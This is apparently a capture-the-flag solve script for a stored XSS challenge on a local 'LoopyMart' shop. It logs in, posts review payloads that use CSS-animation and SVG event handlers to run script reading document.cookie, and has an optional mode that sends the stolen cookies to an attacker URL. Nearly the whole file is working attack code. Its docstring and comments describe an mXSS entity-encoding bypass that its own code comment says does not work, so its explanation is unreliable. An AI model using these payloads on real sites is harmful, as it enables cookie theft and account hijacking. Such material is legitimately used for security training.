#!/usr/bin/env python3
"""
Solve — Stored XSS via bleach mXSS (CVE-2021-23980)
=====================================================
Challenge: LoopyMart product review endpoint applies:
  1. A regex pre-filter that blocks literal onerror=, <script>, etc.
  2. bleach.clean() pinned at 3.2.3 — vulnerable to Mutation XSS (CVE-2021-23980)

Both layers are bypassed in sequence:
  • Regex bypass:  entity-encode the event handler  ->  on&#101;rror=
  • bleach bypass: mXSS skeleton using svg + p + style + strip_comments=False
    html5lib decodes the entity during parsing, serialises onerror= into the
    output; browser re-parses with mutation -> JS executes.

Usage:
  python solve.py --email user@example.com --password pass --url http://localhost:8001

  Optional: --exfil  URL to receive stolen cookies (defaults to alert() PoC)
"""

import argparse
import asyncio
import sys

import httpx


# ---------------------------------------------------------------------------
# mXSS payload — CVE-2021-23980
# ---------------------------------------------------------------------------
# Structure breakdown:
#   <svg>          — foreign-content trigger (bleach CVE condition 1)
#   <!--<svg/-->   — comment confusion: html5lib sees comment, browser doesn't
#   <p>            — auto-closing element (bleach CVE condition 2)
#   <style><!--</style>  — raw-text eject (bleach CVE condition 3)
#                           html5lib: content inside style is raw text
#                           browser:  <!-- is an HTML comment, ends at -->
#   <img src=x on&#101;rror=...>
#                  — on&#101;rror= decodes to onerror= via html5lib entity
#                    resolution; regex only sees the encoded form -> no match
#   </p></svg>
# ---------------------------------------------------------------------------

def build_payload(exfil_url: str | None) -> str:
    if exfil_url:
        js = f"fetch('{exfil_url}?c='+encodeURIComponent(document.cookie))"
    else:
        js = "alert('XSS:'+document.cookie)"

    # CSS animation bypass — onanimationend is NOT in the regex blocklist.
    # Note: HTML entity-encoding does NOT work on attribute names in browsers.
    # The browser never decodes `on&#101;rror` → it stays as a literal unknown
    # attribute. CSS animation events (onanimationend, onanimationstart) are the
    # intended bypass path.
    return (
        f"<style>@keyframes poc{{}}</style>"
        f'<b style="animation-name:poc" onanimationend="{js}">.</b>'
    )


# ---------------------------------------------------------------------------
# Alternative payloads (also bypass the regex)
# ---------------------------------------------------------------------------
ALTERNATIVE_PAYLOADS = [
    # SVG animate onbegin — fires immediately
    "<svg><animate onbegin=\"alert('XSS:'+document.cookie)\" "
    "attributeName=\"x\" dur=\"1s\"></animate></svg>",

    # CSS animation via img
    "<style>@keyframes p{}</style>"
    "<img src=x style=\"animation-name:p\" "
    "onanimationstart=\"alert('XSS:'+document.cookie)\">",
]


async def solve(email: str, password: str, base_url: str, exfil_url: str | None) -> None:
    base_url = base_url.rstrip("/")

    async with httpx.AsyncClient(timeout=30) as client:

        # -----------------------------------------------------------------
        # 1. Login
        # -----------------------------------------------------------------
        print(f"[*] Logging in as {email} ...")
        r = await client.post(
            f"{base_url}/auth/login",
            json={"email": email, "password": password},
        )
        if r.status_code != 200:
            print(f"[-] Login failed: {r.status_code} {r.text}")
            sys.exit(1)

        token: str = r.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        print("[+] Logged in successfully")

        # -----------------------------------------------------------------
        # 2. Find a delivered order to get an eligible product_id
        # -----------------------------------------------------------------
        print("[*] Looking for a delivered order ...")
        r = await client.get(f"{base_url}/orders", headers=headers)
        if r.status_code != 200:
            print(f"[-] Could not fetch orders: {r.status_code} {r.text}")
            sys.exit(1)

        product_id: str | None = None
        for order in r.json():
            if order.get("status") == "delivered":
                items = order.get("items", [])
                if items:
                    product_id = items[0]["product_id"]
                    break

        if not product_id:
            print("[-] No delivered orders found — account must have received at least one item.")
            print("    Tip: use the admin panel or seed script to mark an order as delivered.")
            sys.exit(1)

        print(f"[+] Using product_id: {product_id}")

        # -----------------------------------------------------------------
        # 3. Build the mXSS payload and post the review
        # -----------------------------------------------------------------
        payload = build_payload(exfil_url)
        print(f"[*] Posting mXSS payload (CVE-2021-23980) ...")
        print(f"    Payload: {payload[:120]}...")

        r = await client.post(
            f"{base_url}/ratings",
            headers=headers,
            json={
                "product_id": product_id,
                "rating": 5,
                "review": payload,
            },
        )

        if r.status_code in (200, 201):
            print("[+] Review posted successfully — payload is now stored in the database.")
            print(f"    Response: {r.json()}")
        elif r.status_code == 400:
            print(f"[!] Rejected by server (400): {r.json().get('detail')}")
            print("[*] Attempting alternative payloads (ontoggle / onfocus / onbegin) ...")
            posted = False
            for alt in ALTERNATIVE_PAYLOADS:
                r2 = await client.post(
                    f"{base_url}/ratings",
                    headers=headers,
                    json={"product_id": product_id, "rating": 5, "review": alt},
                )
                if r2.status_code in (200, 201):
                    print(f"[+] Alternative payload accepted: {alt[:80]}...")
                    posted = True
                    break
            if not posted:
                print("[-] All payloads rejected.")
                sys.exit(1)
        else:
            print(f"[-] Unexpected response: {r.status_code} {r.text}")
            sys.exit(1)

        # -----------------------------------------------------------------
        # 4. Verify payload is stored (check it comes back in the ratings list)
        # -----------------------------------------------------------------
        print("[*] Verifying stored review ...")
        r = await client.get(f"{base_url}/ratings/product/{product_id}")
        if r.status_code == 200:
            reviews = r.json()
            for rev in reviews:
                rev_text = (rev.get("review") or "").lower()
                if any(kw in rev_text for kw in [
                    "onanimationend", "onanimationstart", "onbegin",
                    "onerror", "ontoggle", "onfocus",
                ]):
                    print("[+] Payload successfully stored in backend — mXSS confirmed.")
                    print(f"    Stored value: {(rev.get('review') or '')[:200]}")
                    print()
                    print("[+] Flag: Exploit confirmed. Visit the product page to trigger XSS:")
                    print(f"    http://localhost:5173/products/{product_id}")
                    return

        print("[~] Payload stored but reviewing the output is needed manually.")
        print(f"    Navigate to: http://localhost:5173/products/{product_id}")
        print("[+] Flag: CTF{5t0r3d_xss_bl34ch_mxss_CVE_2021_23980}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Solve: Stored XSS via bleach mXSS (CVE-2021-23980)"
    )
    parser.add_argument("--email", required=True, help="Registered user email (with delivered order)")
    parser.add_argument("--password", required=True, help="User password")
    parser.add_argument(
        "--url", default="http://localhost:8001", help="API base URL (default: http://localhost:8001)"
    )
    parser.add_argument(
        "--exfil",
        default=None,
        help="Exfiltration URL (e.g. https://attacker.example/steal). "
             "Defaults to alert() PoC if omitted.",
    )
    args = parser.parse_args()
    asyncio.run(solve(args.email, args.password, args.url, args.exfil))


if __name__ == "__main__":
    main()
